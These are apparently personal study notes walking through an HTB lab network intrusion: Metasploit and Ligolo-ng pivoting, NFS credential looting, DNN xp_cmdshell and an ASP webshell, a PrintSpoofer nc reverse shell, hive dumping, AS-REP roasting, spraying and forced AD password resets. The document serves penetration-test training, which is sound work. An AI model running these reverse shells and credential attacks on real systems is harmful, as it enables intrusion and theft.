set payload linux/x86/meterpreter/reverse_tcp
set LHOST 10.10.14.x ; set LPORT 443 ; exploit
# on dmz01:  chmod +x shell.elf ; ./shell.elf
```

3. Once you catch the Meterpreter session, auto-add routes to the internal subnet:

```
background
use post/multi/manage/autoroute
set SESSION 1 ; set subnet 172.16.8.0 ; run
```

Now all MSF modules reach `172.16.8.0/23` through that session.

#### Find live hosts in the internal subnet

- **Meterpreter:** `use post/multi/gather/ping_sweep` → `set rhosts 172.16.8.0/23` → `run`
- **From dmz01 directly (fastest — bash ping sweep):**

```bash
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```

- **Or a static nmap binary** uploaded to dmz01 (no `-sT` proxy slowness): `./nmap --open -iL live_hosts`

Found 3 new hosts (besides dmz01 itself at `.120`):

|Host|Open ports|What it is|
|---|---|---|
|172.16.8.3|53,88,135,139,389,445,464,593,636|**Domain Controller** (Kerberos+LDAP) — leave for now, unlikely directly exploitable|
|172.16.8.20|80, **2049 NFS**, 135,139,445,3389|Windows **DEV01** — HTTP + NFS interesting|
|172.16.8.50|**8080**, 135,139,445,3389|Windows — Tomcat on 8080|

#### Enumerate the new hosts (quick hits first)

1. **DC (172.16.8.3) — SMB NULL session** (free password policy + user list → safe spraying):

```bash
proxychains enum4linux -U -P 172.16.8.3
```

→ got domain name `INLANEFREIGHT` + SID, but users/policy = `ACCESS_DENIED` → **dead end** (no null access). Save Kerbrute/AS-REP for later if you get usernames.

2. **Tomcat (172.16.8.50:8080)** — brute the manager login:

```bash
# proxychains msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts 172.16.8.50 ; set stop_on_success true ; run
```

→ no weak creds → **dead end** (on an internal, a locked-down Tomcat is normal; only report if you get in).

3. **DEV01 (172.16.8.20) — DotNetNuke + NFS** (this is the win):
   - Port 80 = **DotNetNuke (DNN)**, the ".NET WordPress". Register → needs admin approval → dead end for now.
   - Port 2049 = **NFS**. List exports:

```bash
proxychains showmount -e 172.16.8.20       # → /DEV01 (everyone)  = anonymous access!
```
   
   - **Mount it from dmz01** (you can't mount through proxychains — but you're root on dmz01, which can reach it directly):

```bash
# on dmz01:
mkdir /tmp/DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
cat /tmp/DEV01/DNN/web.config      # config files = creds
```
  
   → `web.config` leaks the DNN admin password:
   
```
Administrator : D0tn31Nuk3R0ck$$@123
```

#### Bonus: sniff the wire (you're root on a box in their network)

```bash
tcpdump -i ens192 -s 65535 -w ilfreight.pcap     # Ctrl+C after a while, open in Wireshark
```

Nothing here, but on a busy VLAN this grabs cleartext creds for free.

Chain: dual-homed dmz01 → SSH `-D` SOCKS (or MSF autoroute) → ping-sweep `172.16.8.0/23` → 3 new hosts → NFS export `/DEV01` world-readable → mount from dmz01 → `web.config` → **DNN admin creds**.

Lessons:
- A **dual-homed host** (two NICs / two subnets) is the whole point of a foothold — it's your bridge into the hidden network. Check `ip a` / `ifconfig` on every box you own.
- **Tunnel, don't scan blind:** `ssh -D` + ProxyChains, or Meterpreter autoroute. Through a proxy, **`nmap -sT` only**, and it's slow — prefer a ping sweep or a static nmap *on* the pivot host.
- **NFS exports are classic internal loot** — `showmount -e`, mount, read. Config files (`web.config`, `.env`, `settings.php`) are the first thing to `cat`.
- **Proxychains can't do everything** (no mount, no SYN scan) — when stuck, do the action **from the pivot host itself** (you have root there).
- Triage new hosts fast: DC = leave unless you have creds; locked Tomcat/SMB = note & move on; **the misconfig (world-readable NFS) is where you spend time.**



---
---

# Phase 6.1: Ligolo-ng — the complete pivot (my favorite, learn this cold)

**What it is:** Ligolo-ng gives your attack box a **real network interface (a tun)** wired into the target's internal network. Once it's up, the hidden subnet (`172.16.8.0/23`) is reachable by **every tool natively** — `nmap`, `crackmapexec`, `impacket`, Firefox, `mount` — with **no `proxychains` prefix** and **no `-sT` restriction**. It behaves like a VPN into the client. This is why it beats SSH `-D`/proxychains.

**Mental model — two binaries:**

- **`proxy`** → runs on **YOUR attack box**. The brain. Has an interactive console.
- **`agent`** → runs on the **pivot host (dmz01)**. The dumb relay. Connects *back* to your proxy.
- Direction of connection: **agent → proxy** (the pivot reaches out to you on `11601`), just like a reverse shell. So your proxy is the listener.

```
[your box] nmap 172.16.8.20
     │
     ▼  (ligolo tun interface)
[proxy :11601] ◄──────connect──────── [agent on dmz01] ──► 172.16.8.0/23
```

## Step 0 — get both binaries (once, on your box)
**Two ways:**

**(a) Pre-built (fastest)** — grab matching releases from https://github.com/nicocha30/ligolo-ng/releases :
- `proxy` → Linux (your attack box)
- `agent` → match the **pivot's OS/arch** (here Linux x64; use the `.exe` for a Windows pivot)

**(b) Build from source** (what you do if you `git clone`d it — needs Go installed):

```bash
cd ~/ligolo-ng
make                              # builds EVERYTHING into ./dist/
```

`make` outputs to the **`dist/`** folder with long per-platform names, NOT a plain `proxy`/`agent`:

```
dist/ligolo-ng-proxy-linux_amd64        ← proxy for YOUR Linux box
dist/ligolo-ng-agent-linux_amd64        ← agent for a Linux pivot
dist/ligolo-ng-agent-windows_amd64.exe  ← agent for a Windows pivot
```

To save typing, make short names once:

```bash
cp ~/ligolo-ng/dist/ligolo-ng-proxy-linux_amd64 ~/proxy
cp ~/ligolo-ng/dist/ligolo-ng-agent-linux_amd64 ~/agent
```

## Step 1 — create the tun interface (on your box, once per boot)

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

`ligolo` is just the interface name — Ligolo routes internal traffic through it. (Nothing has an IP yet; the route in Step 5 does that job.)

## Step 2 — start the proxy / listener (on your box)

```bash
./proxy -selfcert
```

- `-selfcert` = auto-generate a self-signed TLS cert (fine for labs/CTF; in prod use a real cert with `-certfile`/`-keyfile`).
- This drops you into the **ligolo-ng console** (`ligolo-ng »`) and listens on **:11601**.

## Step 3 — get the agent onto the pivot and run it

Upload using whatever access you have (here the root SSH key from Phase 5):

```bash
scp -i dmz01_key agent root@10.129.x.x:/tmp
```

On the pivot (dmz01), point it back at **your box's IP**:

```bash
chmod +x /tmp/agent
/tmp/agent -connect 10.10.14.x:11601 -ignore-cert
```
- `-connect` = your attack box (the proxy). `-ignore-cert` = accept the self-signed cert.
- To survive logout / run quietly: `setsid /tmp/agent -connect 10.10.14.x:11601 -ignore-cert &`
- **Windows pivot:** `agent.exe -connect 10.10.14.x:11601 -ignore-cert`

Back in the proxy console you'll see: `Agent joined … name=root@dmz01`.

## Step 4 — select the session and start the tunnel (in the proxy console)

```
ligolo-ng » session
   [1] - root@dmz01 - 10.129.x.x      ← type 1, Enter
   
ligolo-ng » start
```

`start` activates the tunnel through that agent.

Before routing, ask the agent what networks it can see (so you know what to route):

```
ligolo-ng » ifconfig
```

→ lists dmz01's NICs, including `ens192 = 172.16.8.120/23` → that's your target subnet.

## Step 5 (MUST) — add the route (on your box) → done, scan natively

```bash
sudo ip route add 172.16.8.0/23 dev ligolo
```

Now the whole subnet is reachable with **any tool, no proxychains**:

```bash
nmap -sS -p- --min-rate 2000 172.16.8.20      # full SYN scan — works now
showmount -e 172.16.8.20
crackmapexec smb 172.16.8.3
xfreerdp /v:172.16.8.50 /u:... ; firefox http://172.16.8.20
```

Reach a service bound to **dmz01 itself** via its internal IP `172.16.8.120`. Then , with shown in previous section, grab the credentials and its time to hop onto the second machine.

if in some points you ligolo goes down `sudo ip link set ligolo up`.

## Listeners — for connections that come BACK to you (reverse shells, file pulls)

**The key idea — direction matters:**

- **You → inward** (nmap, nxc, browsing): the route already handles it. No listener needed.
- **Inward → back to you** (a reverse shell, a victim downloading your file): the victim **can't reach your IP** — it only knows how to talk to its neighbor, dmz01. This is where you need a listener.

A **listener** opens a port **on dmz01** and pipes whatever hits it back through the tunnel to **your** machine:

```bash
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# open :4444 on dmz01 send it to YOUR 127.0.0.1:4444
```

**Reverse shell example:**

```
DEV01 ──connect to 172.16.8.120:4444──► dmz01 (listener) ──tunnel──► YOUR 127.0.0.1:4444                                                                      (nc -lvnp 4444 catches it)
```

So: start `nc -lvnp 4444` on your box, add the listener, and point the payload at **dmz01's IP `172.16.8.120`** — NOT your `10.10.14.x`.

**File transfer is the same trick:** listener on `dmz01:8080` → DEV01 downloads from `http://172.16.8.120:8080/tool.exe` → it secretly comes from your web server.

Manage them: `listener_list`, `listener_del <id>`.

> **One rule to remember:** if the internal host has to _start_ the connection to you → point it at **dmz01's IP** and add a listener. If _you_ start the connection → just use the route.

## Double pivot (going one network deeper: you → dmz01 → DEV01 → deeper subnet)

Say you own DEV01 and find it has a second NIC into an even deeper network (`172.16.9.0`) that only DEV01 can reach. You don't restart — you add DEV01 as a **second agent**, chained through the first.

```
YOU ──►[ dmz01 ]──► 172.16.8.0 ──►[ DEV01 ]──► 172.16.9.0 (hidden, only DEV01 reaches it)        agent #1                   agent #2
```

**Why a listener again?** The new agent on DEV01 must phone home to your proxy (:11601), but DEV01 can't reach your IP — only dmz01 can. So you relay the callback through dmz01, exactly like a reverse shell.

1. **Listener on dmz01** to catch the second agent's callback:

```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

2. **Run the agent on DEV01**, pointing at **dmz01** (not you):

```
agent -connect 172.16.8.120:11601 -ignore-cert
```

3. **In the console:** `session` → pick the DEV01 agent → `start`, then route the deeper subnet:

```
sudo ip route add 172.16.9.0/24 dev ligolo
```

Now `nmap 172.16.9.x` from your box flows **you → dmz01 → DEV01 → deep network**, fully transparent. (If two subnets overlap, give each agent its own tun interface.)

## Teardown

```
# console:ligolo-ng » stop# your box:sudo ip route del 172.16.8.0/23 dev ligolosudo ip link set ligolo downsudo ip tuntap del mode tun ligolo
```

**Full chain, memorized:** `tun up` → `./proxy -selfcert` → upload+run `agent -connect ME:11601 -ignore-cert` → console `session`/`start` → `ip route add SUBNET dev ligolo` → scan with any tool. Callbacks inbound = `listener_add`. Second hop = listener on hop-1 + new agent + new route.

**Why I reach for Ligolo first:** VPN-like (any tool, full nmap SYN/UDP/scripts, browser works), clean multi-hop, inbound listeners for reverse shells. Only cost: you must upload the agent binary to the pivot. If you can't drop a binary → fall back to SSH `-D` + proxychains (Option A).

---
---

# Phase 7 : Get your FIRST domain credential (pick a route)

> **This phase has ONE goal: obtain a single valid DOMAIN credential.** There are multiple *routes* to it (all inside this section) — take whichever the box hands you. The moment any route yields a working `user:pass` (or hash), you're done here → go to **Phase 6.3 (Climb to Domain Admin)**.
>
> - **Route A — Exploit a host:** pop a reachable box (e.g. DNN → DEV01), get SYSTEM, dump its secrets for a cached domain cred.

- **Route B — No-cred+ hosts for AD attacks:** hit the DC with zero creds — anonymous enum → build a user list → AS-REP roast → careful spray.
>
> Routes A and B are **parallel options, not sequential** — pick based on what's exposed. Both feed the same Phase 6.3.

## STOP being confused about the tools — read this first

Every AD tool answers **one** of three questions. Figure out which question you're asking, and the tool picks itself.

| Your question right now | Tool | Needs a credential? | What it actually does |
|---|---|---|---|
| "Will you tell me stuff for **FREE**?" | **enum4linux-ng** | ❌ No | Dumps users/groups/shares/policy over SMB+LDAP **if** anonymous is allowed. Pure recon, reads only. |
| "Does this **key work**, and where am I admin?" | **nxc** (NetExec) | ✅ Usually | The swiss-army knife. Validates creds, sprays, pass-the-hash, dumps SAM/LSA/NTDS, runs across a whole subnet. **Reads AND attacks.** |
| "Are there users with **no pre-auth / weak service accounts**?" | **impacket-GetNPUsers / GetUserSPNs** | ❌ / ✅ | Pulls crackable Kerberos hashes (AS-REP needs no creds; Kerberoast needs one cred). |
| "Show me the **map** — who can reach Domain Admin?" | **BloodHound** | ✅ Yes | Collects the whole AD graph, shows attack paths. |
| "Let me **change/abuse** AD objects (reset pw, add to group)?" | **bloodyAD** | ✅ Yes | Read + write AD over LDAP. The *action* tool once you have a path. |

**The mental model (burn this in):**

```
enum4linux  = "knock and ask nicely"        → NO password, recon only
nxc         = "try the keys / break in"     → password = full power
bloodyAD    = "rearrange the furniture"     → password + a known ACL path
```

You CANNOT run bloodyAD / BloodHound / Kerberoast until you hold a credential — don't even try them before then, they'll just fail auth.


## Route A — Exploit a found host (DNN → DEV01 → SYSTEM → cached domain cred)

> **Scope of these notes:** the HTB module shows this chain with SSH `-R`, proxychains, and CrackMapExec. Below is the same chain mapped onto **your core kit (Ligolo-ng, impacket, nxc)** — i.e. *which of your tools replaces each guide step, and why.* The one unavoidable outside tool is **PrintSpoofer** (SeImpersonate abuse is a Windows-local primitive none of the four provide).

**The chain (overview):** DNN SuperUser login → code-exec on DEV01 (`172.16.8.20`) → `SeImpersonate` → SYSTEM → dump local secrets → recover a **cached domain credential** → that's your entry to the `INLANEFREIGHT.LOCAL` domain.

### Where each core tool slots in (the substitution table)

| HTB step                                           | HTB's tool                                  | **Your core-kit replacement**                                                                 | Why yours is better here                                               |
| -------------------------------------------------- | ------------------------------------------- | --------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| Get PrintSpoofer/nc onto DEV01                     | SCP to dmz01 + python web server + certutil | **Ligolo listener** → DEV01 pulls `http://172.16.8.120:<port>/` straight from your attack box | One tunnel already up; no jump-host staging, no proxychains            |
| Catch the reverse shell                            | `ssh -R` + edit `GatewayPorts yes` on dmz01 | **Ligolo listener** (reverse-forward a port off the agent)                                    | No `sshd_config` edit, no root-on-pivot requirement, nothing to revert |
| Confirm the recovered hash works                   | `proxychains crackmapexec smb --local-auth` | **`nxc smb ... --local-auth`** natively over the Ligolo route                                 | cme is dead; nxc + native routing = no proxychains                     |
| Dump SAM/LSA from the hives                        | secretsdump                                 | **impacket-secretsdump** (already your tool — keep it)                                        | Core kit; offline LOCAL mode on the saved hives                        |
| Re-dump LSA remotely to attribute the cleartext pw | CrackMapExec `--lsa`                        | **`nxc smb ... --lsa`**                                                                       | Same action, core tool                                                 |


### **Step 1 — DNN SuperUser → code-exec on DEV01.** 

Log into `http://172.16.8.20` with `Administrator:D0tn31Nuk3R0ck$$@123`. Enable the SQL console's `xp_cmdshell` (Settings → SQL, run one line at a time):

```sql
EXEC sp_configure 'show advanced options', '1'

RECONFIGURE

EXEC sp_configure 'xp_cmdshell', '1'

RECONFIGURE

EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'whoami/priv'
```

So the result shows `seimpersonate` privilege. You can either send  `PrintSpoofer64` file to DC01 with this server's shell `xp_xmdshell` or Alternatively by creating a webshell.  Browsing to `Settings -> Security -> More -> More Security Settings`, add `asp, aspx` to Allowable File Extensions and upload an [ASP webshell](https://raw.githubusercontent.com/XPR1M3/php-shells/refs/heads/master/newaspcmd.asp) at `/admin/file-management` → click on the file.  You will get a proper webshell now.

We'll need nc.exe on the DEV01 host to send ourselves a shell and the PrintSpoofer64.exe binary to leverage `SeImpersonate` privileges.

### **Step 2 — serve your tools over a Ligolo listener** 

(replaces jump-host SCP + certutil-through-proxychains). In the proxy console:

```
ligolo-ng » listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080 --tcp
```

Host the file on your attack box, then pull it on DEV01 (it hits dmz01's IP, Ligolo forwards to you):

```bash
python3 -m http.server 8080        # on your attack box
```

on the webshell:

```webshell
certutil -urlcache -f http://172.16.8.120:8080/PrintSpoofer64.exe C:\DotNetNuke\Portals\0\PrintSpoofer64.exe

certutil -urlcache -f http://172.16.8.120:5556/nc.exe C:\DotNetNuke\Portals\0\nc.exe
```

### **Step 3 — Now as you execute `PrintSpoofer`, you will need to catch it as a shell, and so start reverse-shell listener via Ligolo** 

```bash
ligolo-ng » listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
```

```bash
nc -lvnp 443        # on your attack box; DEV01 connects to 172.16.8.120:443
```

### **Step 4 — SeImpersonate → SYSTEM with PrintSpoofer** (sends a shell via nc):

```cmd
C:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "C:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

Your listener catches a shell as `nt authority\system` on `ACADEMY-AEN-DEV01`.

### **Step 5 — save the hives, then dump with impacket.** As SYSTEM:

```cmd
reg save HKLM\SYSTEM   SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM      SAM.SAVE
```

### **Step 6 -- Pull the three `.SAVE` files back on your attack machine

(either if its shown on DNN file manager---> download, or SMB over the listener):**

**On your attack box** — start an SMB share:

```
impacket-smbserver share . -smb2support -user test -password test
```

**In the Ligolo console** — forward dmz01:445 to your SMB server:

```
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
```

**In your DEV01 shell**  (the reverse shell you got)— mount dmz01’s relayed share and copy:

```bash
net use \\172.16.8.120\share /u:test test

copy C:\DotNetNuke\Portals\0\s.save   \\172.16.8.120\share\
copy C:\DotNetNuke\Portals\0\sam.save \\172.16.8.120\share\
copy C:\DotNetNuke\Portals\0\sec.save \\172.16.8.120\share\
```

Files land in the folder you launched `impacket-smbserver` from.

#### Then dump them (your kit)

```
impacket-secretsdump -system s.save -sam sam.save -security sec.save LOCAL
```


### **Step 7 — validate the recovered creds with nxc** 


```bash
nxc smb 172.16.8.20 --local-auth -u administrator -H <nthash>      # expect (Pwn3d!)
nxc smb 172.16.8.20 --local-auth -u administrator -H <nthash> --lsa  # re-dump LSA to attribute the cleartext pw
```

The cached-logon/LSA secrets yields the first **domain** cred (module: `hporter:Gr8hambino!`). Confirm it against the DC:

```bash
nxc smb 172.16.8.3 -u hporter -p 'Gr8hambino!'                     # [+] = valid domain cred → go to Phase 6.3 (Climb)
```


### Ligolo-ng benefits?

Dude, you are literally just changing the ports in ligolo console, and getting direct connection from your attack box to targets through those ports!


### (Optional) HTB alternatives — the module's original tools

Kept for reference / when the core kit isn't available. These do the **same jobs** the Ligolo/nxc steps above replaced — use them only if you want the module's exact path or Ligolo isn't an option.

**Alt for Steps 2–3 — SSH reverse port forwarding** (instead of Ligolo listeners). Bounce a Meterpreter/reverse shell off dmz01 back to you. Generate a payload pointing at the **pivot's** IP (target can't reach you directly):

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 LPORT=443 -f exe -o teams.exe
```

msf handler on a *different* local port:

```
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0 ; set lport 7000 ; run
```

SSH remote-forward dmz01:443 → your handler:7000:

```bash
ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.x.x -vN
```
> ⚠️ Needs `GatewayPorts yes` in dmz01's `/etc/ssh/sshd_config` (then `service sshd reload`) so the forward binds the pivot's IP, not just localhost — requires **root on the pivot**, opens a hole, and must be reverted. This is exactly the hassle the **Ligolo listener avoids** (Steps 2–3 above).

**Alt for file transfer — jump-host staging:** SCP tools to dmz01 → `python3 -m http.server` on dmz01 → `certutil` download on DEV01. (Ligolo listener collapses this to one step.)

**Alt for cred validation — CrackMapExec over proxychains:**

```bash
proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <nthash>
```

Same result as `nxc smb ... --local-auth` over the Ligolo route — but cme is unmaintained and proxychains can't do everything. Prefer nxc.

**Alt privesc / cred tools (not replaced — different capability):** PrintNightmare (privesc), Mimikatz (in-memory cred dump instead of hive-save + secretsdump). Note either as a finding if used.


## Route B — No-cred + hosts - AD attacks (you have NOTHING yet)

**Why this route is "blind":** with no creds you can't *ask* the domain anything authenticated, so you probe for the handful of things AD leaks by default or misconfiguration. Each check below has a specific reason it might work — know the *why* so you're not just running commands.

**The no-creds checklist — WHAT to check blindly, WHY it might work, WHICH tool:**

| # | Check | Why it might pay off | Tool |
|---|---|---|---|
| 1 | SMB null session | Old/misconfigured DCs allow anonymous SMB → leaks users, shares, policy | `enum4linux-ng`, `nxc smb -u '' -p ''` |
| 2 | Guest account | `Guest` sometimes enabled with blank pw → same leak as null | `nxc smb -u guest -p ''` |
| 3 | Anonymous LDAP | LDAP may allow anonymous bind → dump the entire directory | `nxc ldap -u '' -p ''`, `ldapsearch` |
| 4 | RID cycling | Even when listing is blocked, you can often brute user IDs 500→ | `nxc smb --rid-brute` |
| 5 | User existence (Kerberos) | Kerberos tells you if a username is **real** before you have a pw — builds a valid list with zero auth | `kerbrute userenum` |
| 6 | AS-REP roasting | Users with "pre-auth disabled" hand you a **crackable hash with NO password** | `impacket-GetNPUsers` |
| 7 | Looted creds reuse | A pw from web.config/NFS/a shell may be reused in the domain | `nxc smb` to test it |

**Step 1 — Try to get info for FREE (anonymous).** *Why first?* It costs nothing, isn't noisy, and if it works you skip straight to a user list:

```bash
enum4linux-ng -A 172.16.8.3                      # the classic "knock" — all anonymous SMB/LDAP checks
nxc smb 172.16.8.3 -u '' -p ''                   # null session? (confirms + shows domain/OS banner)
nxc smb 172.16.8.3 -u guest -p ''                # guest enabled?
nxc ldap 172.16.8.3 -u '' -p '' --users          # anonymous LDAP bind?
```

*Why enum4linux AND nxc here?* enum4linux formats anonymous SMB/LDAP nicely and does more checks; nxc confirms fast and prints the **domain name + OS** (which you need for every later command). Run both — they overlap but each catches things the other misses.
- Works → you get a **username list** → go to Step 2.
- `ACCESS_DENIED` (our locked DC) → anonymous is dead, go to Step 1b.

**Step 1b — Build a user list WITHOUT anonymous access.** *Why bother?* Every Phase-A attack (roasting, spraying) needs usernames. No list = no attack. Two ways to get names even when the DC won't list them:

```bash
# RID cycling — the DC won't give the list, but it'll often answer "who is RID 1104?" one by one

nxc smb 172.16.8.3 --rid-brute 5000

# Kerbrute — Kerberos replies differently for real vs fake usernames, so you can VALIDATE names
#   with zero credentials and zero lockout risk (pre-auth failures don't count against lockout)
kerbrute userenum -d inlanefreight.local --dc 172.16.8.3 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

*Why kerbrute and not just spray?* kerbrute confirms **which usernames exist** before you ever send a password — so your later spray only targets real accounts (quieter, no wasted lockout budget). Also mine names from **loot you already have** (web.config, NFS, emails, a DEV01 shell) → format as `firstname.lastname` / `flast`.

**Step 2 — AS-REP roast: the best no-cred shot.** *Why this is special:* if any account has "Kerberos pre-authentication" disabled, the DC will hand you an **encrypted blob you can crack offline — with NO password required.** Free hash → free password:

```bash
impacket-GetNPUsers inlanefreight.local/ -usersfile users.txt -dc-ip 172.16.8.3 -no-pass -format hashcat -outputfile asrep.hash

hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

*Why it works:* pre-auth is normally what stops this; admins sometimes disable it for legacy apps → you walk right in.

**Step 3 — Password spray (careful!).** *Why last:* it's the noisiest and risks lockouts. Only spray once you have a real user list (Step 1b) and ideally the lockout policy:

```bash
# ONE password across ALL users — NEVER many passwords on one user (that's what locks accounts)
nxc smb 172.16.8.3 -u users.txt -p 'Welcome2024!' --continue-on-success
```

*Why "one password, many users"?* lockout counts *failures per account*. Spraying one guess hits each account once → stays under the threshold. Good guesses: `Season+Year!` (`Autumn2024!`), `Company123`, `Welcome1`.

⚠️ Spray one password, **wait out the observation window**, then the next. Blind rapid spraying = locked accounts = alarms + angry client.

➡️ **The moment ANY of these returns a working `user:password` (or hash), Route A is done → jump to Phase 6.3 (Climb).** If the locked-down DC gives you nothing, switch to **Route B (below)** — exploit a host for a cached cred instead.

---
---

# Phase 8: Lateral Movement & Domain Enumeration (hporter → more creds)

**Where we are:** we have our first DOMAIN cred `hporter:Gr8hambino!` (from DEV01's LSA). Goal now: enumerate AD, abuse what hporter can touch, and collect more creds while hunting a path to Domain Admin. DEV01 is our staging host, but with Ligolo we can do almost everything **from the attack box directly**.

**Kit-first mapping for this phase** (what replaces the module's tools):

| HTB Module does it with                                                                                                                                      | Your kit                                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------- |
| SharpHound.exe on the host                                                                                                                                   | **bloodhound-python** / **nxc --bloodhound** over the Ligolo route    |
| PowerView `Set-DomainUserPassword` (+ RDP + SSH `-L`)                                                                                                        | **bloodyAD set password** — straight from Linux, no RDP, no PowerView |
| `proxychains crackmapexec`                                                                                                                                   | **nxc** natively over Ligolo                                          |
| PowerView / `GetUserSPNs.py` Kerberoast                                                                                                                      | **impacket-GetUserSPNs**                                              |
| `DomainPasswordSpray.ps1`                                                                                                                                    | **nxc** spray                                                         |
| Kept (no kit equivalent): **evil-winrm** (WinRM shell), **Snaffler**, **mimikatz**, **LaZagne**, **Inveigh**, the **Sysax** LPE — host-local or niche tools. |                                                                       |

The AD ENUM KIT TOOL:

```
# 1) Full graph for BloodHound (the big one)

bloodhound-python -u backupadm -p '<pw>' -d inlanefreight.local -ns 172.16.8.3 -c All --zip

# 2) Quick domain enum with nxc (no GUI needed)

nxc smb  172.16.8.3 -u backupadm -p '<pw>' --users          # all domain users
nxc smb  172.16.8.3 -u backupadm -p '<pw>' --groups         # groups
nxc smb  172.16.8.3 -u backupadm -p '<pw>' --shares         # readable shares
nxc smb  172.16.8.3 -u backupadm -p '<pw>' --pass-pol       # password policy 

(before spraying)
nxc smb  172.16.8.3 -u backupadm -p '<pw>' --loggedon-users # who's logged on (if admin)

# 3) Targeted LDAP queries with bloodyAD

bloodyAD --host 172.16.8.3 -d inlanefreight.local -u backupadm -p '<pw>' get writable          
# what can I abuse?

bloodyAD --host 172.16.8.3 -d inlanefreight.local -u backupadm -p '<pw>' get search --filter '(adminCount=1)'  
# privileged accounts

bloodyAD --host 172.16.8.3 -d inlanefreight.local -u backupadm -p '<pw>' get dnsDump            
# internal hostnames

# 4) Where can this cred actually log in? (access sweep)

nxc smb   172.16.8.0/24 -u backupadm -p '<pw>'   # admin anywhere? (Pwn3d!)
nxc winrm 172.16.8.0/24 -u backupadm -p '<pw>'
nxc rdp   172.16.8.0/24 -u backupadm -p '<pw>'
```


**Every time you get a new cred, do this in BloodHound:**

1. Search the user
2. Click **Outbound Object Control**
3. Look for edges: `GenericAll`, `GenericWrite`, `ForceChangePassword`, `WriteDACL`, `Owns`, `AddMember`
4. Follow the path toward DA


## Step 0 — one-time setup for AD tools over Ligolo (do this FIRST or things fail "for no reason")

Kerberos is time-sensitive by design. Every Kerberos ticket is stamped with the time it was created, and the DC rejects any ticket whose timestamp is too far from its own clock — default tolerance is 5 minutes. There's **no DNS over the tunnel** and **Kerberos hates clock skew**  — two silent killers of bloodhound-python, GetUserSPNs, bloodyAD `-k`, smbclient by name, etc. Step 0 is on your attack box (your Kali/Parrot), editing your /etc/hosts. Not on dmz01, not on any target. Fix both up front:

```bash
# 1) name resolution — map the DC + domain FQDN (SharpHound/BloodHound/Kerberos resolve by name)

echo "172.16.8.3  dc01.inlanefreight.local inlanefreight.local DC01 INLANEFREIGHT" | sudo tee -a /etc/hosts

# 2) time sync to the DC — or Kerberos throws KRB_AP_ERR_SKEW
sudo ntpdate 172.16.8.3        # (or: sudo rdate -n 172.16.8.3)  — re-run if it drifts

# If you get 'no eligible server', try
sudo ntpdate -u 172.16.8.3

# if this doesnt work,then try:
nmap -Pn -sT -p445 --script smb2-time 172.16.8.3     # read DC time, Over Ligolo you must **skip host discovery** (-Pn) and use a TCP connect scan (-sT)
sudo timedatectl set-ntp 0                    # stop auto-sync pulling it back
sudo date -s "2026-10-17 14:32:05"            # match the DC
```

 Rule: use **IP** for raw SMB/nxc (works fine), but **name** for anything Kerberos/BloodHound → that's why the hosts line matters.

## Step 1 — Map the domain with BloodHound (kit: collect over Ligolo)

Lets first check if this new use has any access to anywhere or not

Enumeration is gated by access. Don't guess a cred's access — sweep it across protocols with nxc:

```bash
nxc smb   172.16.8.0/24 -u backupadm -p '<pw>'   # valid? admin? → [+] / (Pwn3d!)

nxc winrm 172.16.8.0/24 -u backupadm -p '<pw>'   # shell via WinRM? → (Pwn3d!) = evil-winrm works

nxc rdp   172.16.8.0/24 -u backupadm -p '<pw>'   # RDP allowed? → [+]
```

We found no access to anywhere! so Lets check with bloodhound to see what it actually does:

**Pattern to remember for everything over Ligolo:** TCP works, UDP usually doesn’t. So:

- DNS → `--dns-tcp`
- nmap → `-Pn -sT`
- time sync → read via SMB (`nxc --times` / `smb2-time`), not NTP

```bash
# run the collector FROM your box through the tunnel — no need to drop SharpHound on DEV01

bloodhound-python -u hporter -p 'Gr8hambino!' -d inlanefreight.local -ns 172.16.8.3 --dns-tcp -c All --zip

# (alt) nxc can collect too:
nxc ldap 172.16.8.3 -u hporter -p 'Gr8hambino!' --bloodhound --collection All --dns-server 172.16.8.3
```

Stand up BloodHound and ingest:

```bash
sudo neo4j start          # first run: open http://localhost:7474, change the default neo4j/neo4j creds
bloodhound                # launch the GUI → log in → drag the .zip (or all .json) onto the window
```

In the GUI: search `hporter` → mark **Owned** → **Node Info → First Degree Object Control** (or run **Shortest Path from Owned Principals**).
➡️ Finding: **hporter has `ForceChangePassword` over `ssmalls`.** (Also note: all Domain Users have RDP to DEV01 → finding *Excessive AD Group Privileges*, medium.)

## Step 2 — Abuse ForceChangePassword with bloodyAD (THE kit win)

The module does this with PowerView over an RDP session (needs SSH `-L`, drive redirect, etc.). **bloodyAD does it in one line from Linux** over the Ligolo route:

```bash
bloodyAD --host 172.16.8.3 -d inlanefreight.local -u hporter -p 'Gr8hambino!' set password ssmalls 'Str0ngpass86!'
```


Confirm the new cred against the DC with nxc:

```bash
nxc smb 172.16.8.3 -u ssmalls -p 'Str0ngpass86!'      # [+] = success
```

Note it in your activity log (you changed a user's password) — mention to the client; most say proceed.

## Step 3 — Share hunting as ssmalls (kit: nxc spider_plus)

Different users = different share access, so re-hunt with each new cred.

```bash
nxc smb 172.16.8.3 -u ssmalls -p 'Str0ngpass86!' -M spider_plus --share 'Department Shares'

# output JSON lands in /tmp/nxc_hosted/ (or /tmp/cme_spider_plus) — read it
```

Interesting hits → pull with **impacket-smbclient** (or smbclient):

```bash
